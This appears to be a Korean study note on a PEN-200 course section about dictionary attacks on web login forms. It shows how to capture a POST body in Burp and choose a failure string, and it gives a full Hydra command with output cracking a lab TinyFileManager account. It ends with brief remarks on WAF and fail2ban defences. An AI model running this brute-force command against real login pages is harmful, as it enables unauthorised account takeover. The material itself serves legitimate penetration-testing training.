# 16.1.2 HTTP POST 로그인 폼

> **HTTP POST Login Form** · PEN-200 §16.1.2

웹 서비스는 로그인해야 그 뒤를 볼 수 있는 경우가 많고, 기본 자격 증명이 안 통하고 다른 벡터도 없으면 딕셔너리 공격이 남은 선택지임. **대부분의 웹 앱에 `admin` 같은 기본 계정이 있으므로** 그 이름을 쓰면 성공률이 크게 오르고 소요 시간도 줄어듦. 예제 대상은 80 포트의 TinyFileManager 이고, 문서상 기본 사용자는 `admin` 과 `user` 임.

**SSH·RDP 와 달리 Hydra 가 폼 구조를 모르므로, 두 가지를 «먼저 수집해야» 함.**

1. **POST 본문** — 사용자명·패스워드 파라미터 이름이 담긴 요청 바디
2. **실패 식별 문자열** — 성공과 실패를 구분할 근거

Burp 로 인터셉트를 켜고 아무 패스워드나 넣어 로그인해 요청 바디를 확보함.

![[PEN200-Fig-250.png]]
*인터셉트한 로그인 POST 요청 — 강조 부분이 Hydra 에 그대로 넘길 요청 바디*

이어 요청을 흘려보내거나 인터셉트를 끄고 브라우저에서 실패 메시지를 확인함. Hydra 는 **응답 본문에서 이 문자열을 찾아 실패로 판정**함.

![[PEN200-Fig-251.png]]
*로그인 실패 시 표시되는 문구 — 이것이 조건 문자열(condition string) 이 됨*

더 복잡한 앱은 요청·응답을 더 파거나 폼 소스를 봐야 실패 지표를 분리할 수 있음(이 모듈 범위 밖).

`http-post-form` 인자는 **콜론으로 구분된 세 필드**임 — ① 폼 위치(`/index.php`) ② 요청 바디(패스워드 자리에 `^PASS^`) ③ 실패 조건 문자열. 타겟 IP 는 프로토콜 없이 그대로 적음.

```
kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-
post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
(l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-
form://192.168.50.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid
username or password
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 16 active
[80][http-post-form] host: 192.168.50.201   login: user   password: 121212
1 of 1 target successfully completed, 1 valid password found
...
```

⚠️ 교재 PDF 자체의 조판으로 `http-post-form` 이 두 줄로 접혀 있음 — 실제로는 한 줄임. 그대로 복사해 쓰면 실패함.

**조건 문자열은 짧게 자를 것.** 오탐을 줄이려고 `password`·`username` 같은 단어를 피해 `Login failed. Invalid` 까지만 남긴 것임 — 실제 응답 문구는 `Login failed. Invalid username or password` 이나, 그 단어들이 정상 응답에도 나타나면 판정이 무너짐.

결과로 `user` / `121212` 를 얻음.

**방어 관점** — 이 공격은 이벤트를 대량 생성하므로 WAF 가 있으면 금방 차단되고, `fail2ban` 류는 실패 횟수 초과 시 계정을 잠금. 다만 **웹 서비스에는 그런 보호가 붙어 있지 않은 경우가 많아** 실제로는 효과가 큰 벡터임. 알려진 정보에서 출발하고 방어 기제를 고려해 강도를 조절하는 것이 요령임.
